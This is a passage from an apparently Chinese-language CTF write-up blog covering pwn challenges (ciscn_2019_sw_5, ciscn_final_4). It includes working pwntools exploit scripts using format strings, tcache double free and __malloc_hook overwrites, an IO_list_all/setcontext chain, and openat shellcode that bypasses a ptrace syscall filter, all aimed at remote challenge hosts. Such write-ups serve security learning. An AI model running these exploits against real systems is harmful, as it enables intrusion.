<span class="string">"%43$p|%10$p|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str(<span class="number">0x3c</span>)+<span class="string">"c%10$hhn|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str(<span class="number">0x9d</span>)+<span class="string">"c%18$hhn"</span></span><br><span class="line">    MyPrint(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    libc_base = int(p.recv(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">247</span> - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    retn_addr = int(p.recv(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">0x20</span> + <span class="number">4</span> + <span class="number">0x64</span> - <span class="number">0xc0</span></span><br><span class="line">    log.success(<span class="string">"retn addr =&gt; "</span> + hex(retn_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(shell_addr)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x08048627')</span></span><br><span class="line">    low = shell_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    high= shell_addr &gt;&gt; <span class="number">16</span></span><br><span class="line">    payload = <span class="string">"%"</span>+str(retn_addr&amp;<span class="number">0xffff</span>)+<span class="string">"c%10$hn|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str(low)+<span class="string">"c%18$hn|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str((retn_addr+<span class="number">2</span>)&amp;<span class="number">0xff</span>)+<span class="string">"c%10$hhn|"</span></span><br><span class="line">    payload += <span class="string">"%"</span>+str(high)+<span class="string">"c%18$hn"</span></span><br><span class="line">    MyPrint(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">        p.interactive()</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">'./chall'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'119.3.172.70'</span>,<span class="number">10005</span>)</span><br></pre></td></tr></table></figure>
<h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><h3 id="ciscn-2019-sw-5-ciscn-2019-nw-2"><a href="#ciscn-2019-sw-5-ciscn-2019-nw-2" class="headerlink" title="ciscn_2019_sw_5/ciscn_2019_nw_2"></a>ciscn_2019_sw_5/ciscn_2019_nw_2</h3><h4 id="程序逻辑-1"><a href="#程序逻辑-1" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>libc-2.27，固定分配<code>0x70</code>(chunk大小为<code>0x80</code>)只能free<code>3</code>次，但malloc之后会输出一次数据，输入技巧题。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>先double free，分配到<code>tcache_struct</code>里<code>0x80</code>对应的位置(需要爆破<code>1/16</code>)，构造一个tcache chain出来，比如我这里是往里写一个<code>*2b0</code>而<code>*2b0</code>后面跟着<code>*2e0</code>，进而得到一个<code>*2b0-&gt;*2e0</code>的链，之后分配到<code>*2b0</code>修改<code>*2e0</code>的size为<code>0x421</code>(注意后面要有一个fake_chunk的prev_in_use=1)，Free掉这个块即可得到Ub(注意此时因为fd=<code>main_arena+96</code>又出了新的链<code>*2e0-&gt;main_arena+96</code>)，再Malloc可以根据末位一定是<code>\xa0</code>分配到<code>*2d0</code>泄露libc，再分配到<code>main_arena+96</code>修改<code>top_chunk</code>到<code>__malloc_hook</code>前面，最后把刚才那个<code>0x420</code>大小的ub分配完再走<code>top_chunk</code>，最终分配到<code>__malloc_hook</code>改为<code>gadgets[1]</code>即可。</p>
<p>问了队友胡师傅(ID太长记不住)，有另一种解法，改tcache的块数量为<code>0xff</code>，double free用来伪造fake chunk的<code>size</code>为0x210，与此同时还能写<code>tcache[0x80]</code>这个块到<code>fake chunk</code>，之后可以分配得到这个块，再释放就到了<code>ub</code>。再分配就可以覆写tcache[0x80]到malloc_hook。</p>
<p>远程数据发送过快可能会粘包，所以这里加了<code>raw_input()</code>多试试就好。</p>
<h4 id="exp-py-4"><a href="#exp-py-4" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_sw_5'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./ciscn_2019_sw_5'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28453</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(title=p64<span class="params">(<span class="number">0</span>)</span>,content=p64<span class="params">(<span class="number">0x21</span>)</span>*<span class="number">13</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"title:\n"</span>)</span><br><span class="line">    p.send(title)</span><br><span class="line">    p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Trigger</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>*<span class="number">0x5000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">        Add()<span class="comment">#0</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="string">"\x80\x70"</span>)<span class="comment">#10</span></span><br><span class="line">    p.recvuntil(<span class="string">"\x80\x70"</span>,drop=<span class="literal">False</span>)</span><br><span class="line">    heap_base = u64((<span class="string">'\x80\x70'</span>+p.recvuntil(<span class="string">" "</span>,drop=<span class="literal">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x80</span></span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(p64(heap_base+<span class="number">0x2e0</span>),p64(heap_base+<span class="number">0x2e0</span>)*<span class="number">13</span>)<span class="comment">#11</span></span><br><span class="line">    payload = p64(heap_base+<span class="number">0x2b0</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    Add(payload)<span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">    Add(p64(heap_base+<span class="number">0x2b0</span>),p64(heap_base+<span class="number">0x2b0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)+p64(heap_base+<span class="number">0x2b0</span>)*<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="string">'\xa0'</span>,<span class="string">'\xa0'</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.recvuntil(<span class="string">"\x7f\x20"</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(p64(libc_base+libc.sym[<span class="string">"__malloc_hook"</span>]<span class="number">-0x28</span>),p64(<span class="number">0</span>))</span><br><span class="line">    Add(p64(libc_base+libc.sym[<span class="string">"__free_hook"</span>]<span class="number">-0x18</span>),p64(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        Add(p64(libc_base+libc.sym[<span class="string">"__free_hook"</span>]<span class="number">-0x18</span>),p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    Add(p64(<span class="number">0</span>),p64(libc_base+libc.sym[<span class="string">'__malloc_hook'</span>])+p64(libc.sym[<span class="string">'__realloc_hook'</span>])+p64(shell_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-final-4"><a href="#ciscn-final-4" class="headerlink" title="ciscn_final_4"></a>ciscn_final_4</h3><h4 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h4><p>应该是UCTF<code>orw_heap</code>的原型题，不过要求更严苛了一点</p>
<h4 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h4><p>Init里禁了系统调用<code>execve</code></p>
<p>题目fork了一个子进程，动作都是在子进程里执行的，父进程去执行<code>watch</code>函数，这个函数里有个循环，<code>ptrace(PTRACE_SYSCALL, a1, 0LL, 0LL);</code>会使得子进程在每次进行系统调用以及结束一次系统调用的时候都会被内核停下来。<code>PTRACE_GETREGS</code>调用将寄存器信息读取出来，往后判断的是寄存器rax的值，即判断系统调用号，这里禁了<code>open/mmap/fork/vfork/ptrace</code>这些系统调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__pid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> v5; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  v5 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"something wrong!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    watch((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5);</span><br><span class="line">  prctl(<span class="number">1</span>, <span class="number">1L</span>L);</span><br><span class="line">  ptrace(<span class="number">0</span>, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  v3 = getpid();</span><br><span class="line">  kill(v3, <span class="number">19</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"you can't call the execve syscall, so you need to find another way to get flag"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"and bewared!, something is watching you !!"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"what is your name? "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0xFF</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hi ! %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      _isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        mwrite();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_18:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      <span class="keyword">new</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">watch</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+34h] [rbp-ECh]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+B8h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  wait(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptrace(PTRACE_SYSCALL, a1, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">    waitpid(a1, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(stat_loc &amp; <span class="number">0x7F</span>) || (<span class="keyword">char</span>)((<span class="keyword">char</span>)((stat_loc &amp; <span class="number">0x7F</span>) + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>) &gt; <span class="number">0</span> || (stat_loc &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span> != <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ptrace(PTRACE_GETREGS, a1, <span class="number">0L</span>L, &amp;v3);</span><br><span class="line">    v2 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> || v2 == <span class="number">9</span> || v2 == <span class="number">57</span> || v2 == <span class="number">58</span> || v2 == <span class="number">101</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"hey! what are you doing?"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>子进程里有<code>new/delete/write</code>等功能，存在<code>double free/UAF</code>。最多分配32个块，最大分配的size为0x1000。程序没开<code>PIE</code>。</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>为了调试先<code>patch</code>一下原程序，只留子进程方便调试。最开始是想直接HOF一把梭劫持到<code>setcontext+53</code>，patch的过了源程序崩了，因为HOF是触发erro报错，这里会调用<code>mmap</code>这个系统调用，所以直接挂了。最后还是按照之前*CTF的那道题自己伪造一个0x60的<code>small bin</code>，之后ub attack改<code>IO_list_all</code>，最终触发_IO_str_overflow等一系列的调用链进到setcontext+53，这里用mprotect修改heap权限，加上可执行，部署shellcode，因为<code>open</code>被禁了，拿<code>openat(0,absolute_path,0)</code>来<code>open</code>文件，之后r/w即可。</p>
<p>第二种方法是结合栈的，这种漏洞其实是很难发现的，在这里我们在malloc的时候输入的位置+<code>0x38</code>是我们输入<code>name</code>的地方，因为没有开<code>PIE</code>我们可以预先设置好<code>rop chains</code>，之后用堆漏洞改<code>__malloc_hook</code>到一个<code>pivot gadgets</code>，从而在<code>malloc</code>的时候去执行<code>rop chain</code>。这个exp就不写了233。</p>
<h4 id="exp-py-5"><a href="#exp-py-5" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./ciscn_final_4'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./ciscn_final_4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28038</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content=<span class="string">'0'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size?\n"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content?\n"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index ?\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index ?\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.sendlineafter(<span class="string">"what is your name?"</span>,<span class="string">'123'</span>)</span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x80</span>,p64(<span class="number">0x31</span>)*<span class="number">16</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0x31</span>)*<span class="number">4</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x50</span>,p64(<span class="number">0x31</span>)*<span class="number">10</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x1f0</span>,p64(<span class="number">0x31</span>)*<span class="number">18</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x60</span>,p64(<span class="number">0x21</span>)*<span class="number">12</span>)<span class="comment">#6</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Show(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#p.recvline()</span></span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    Add(<span class="number">0x20</span>,<span class="string">'\x20'</span>)<span class="comment">#6</span></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0x31</span>)*<span class="number">4</span>)<span class="comment">#7</span></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0x31</span>)*<span class="number">4</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x161</span>))<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    Add(<span class="number">0x150</span>)<span class="comment">#10</span></span><br><span class="line">    <span class="comment">#Delete(10)</span></span><br><span class="line">    <span class="comment">#Delete(2)</span></span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    IO_list_all = libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">    <span class="comment">#Add(0x150,'a'*0x20+p64(0)+p64(0x91)+p64(0)+p64(IO_list_all-0x10))</span></span><br><span class="line">    <span class="comment">#Add(0x80)</span></span><br><span class="line">    <span class="comment">#get small bins</span></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Add(<span class="number">0x20</span>,p64(heap_base+<span class="number">0xc0</span>))<span class="comment">#11</span></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0x31</span>)*<span class="number">4</span>)<span class="comment">#12</span></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0x31</span>)*<span class="number">4</span>)<span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>))<span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Add(<span class="number">0x30</span>)<span class="comment">#15</span></span><br><span class="line">    Add(<span class="number">0x70</span>)<span class="comment">#16</span></span><br><span class="line">    <span class="comment">#change small bin</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">10</span>)</span><br><span class="line">    Delete(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(heap_base+<span class="number">0xd0</span><span class="number">-0x20</span>))<span class="comment">#17</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x20</span>)<span class="comment">#18</span></span><br><span class="line">    Add(<span class="number">0x20</span>)<span class="comment">#18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x311</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">10</span>)</span><br><span class="line">    Add(<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x151</span>))</span><br><span class="line">    Delete(<span class="number">8</span>)</span><br><span class="line">    Delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x140</span>,p64(<span class="number">0x31</span>)*(<span class="number">0xa0</span>/<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x311</span>)+p64(<span class="number">0</span>)+p64(IO_list_all<span class="number">-0x10</span>))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    IO_str_j = libc.sym[<span class="string">'_IO_file_jumps'</span>]+<span class="number">0xc0</span></span><br><span class="line">    <span class="keyword">print</span> hex(IO_str_j)</span><br><span class="line">    setcontext = libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span></span><br><span class="line">    map_addr = libc.sym[<span class="string">'mprotect'</span>]</span><br><span class="line">    heap_base = heap_base - <span class="number">0x20</span></span><br><span class="line">    fake_io = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(heap_base)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64((heap_base+<span class="number">0xf0</span><span class="number">-100</span>)/<span class="number">2</span>)+p64(<span class="number">7</span>)+p64(<span class="number">0xdadaddaaddddaaaa</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x220</span>)+p64(map_addr)+p64(<span class="number">0x0</span>)*<span class="number">6</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xdadaddaaddddaaaa</span>)*<span class="number">6</span>+p64(IO_str_j)+p64(setcontext)</span><br><span class="line">    lis = [str(heap_base+<span class="number">0x228</span>),str(heap_base+<span class="number">0x10</span>),str(heap_base+<span class="number">0x10</span>)]</span><br><span class="line">    sc = <span class="string">"/flag"</span>+<span class="string">"\x00"</span>*<span class="number">11</span>+asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            mov rsi,&#123;0[0]&#125;</span></span><br><span class="line"><span class="string">            xor rdi,rdi</span></span><br><span class="line"><span class="string">            xor rdx,rdx</span></span><br><span class="line"><span class="string">            mov rax,257</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi,3</span></span><br><span class="line"><span class="string">            mov rsi,&#123;0[1]&#125;</span></span><br><span class="line"><span class="string">            mov rdx,48</span></span><br><span class="line"><span class="string">            mov rax,0</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi,1</span></span><br><span class="line"><span class="string">            mov rsi,&#123;0[2]&#125;</span></span><br><span class="line"><span class="string">            mov rdx,48</span></span><br><span class="line"><span class="string">            mov rax,1</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            '''</span>.format(lis))</span><br><span class="line">    Add(<span class="number">0x300</span>,p64(<span 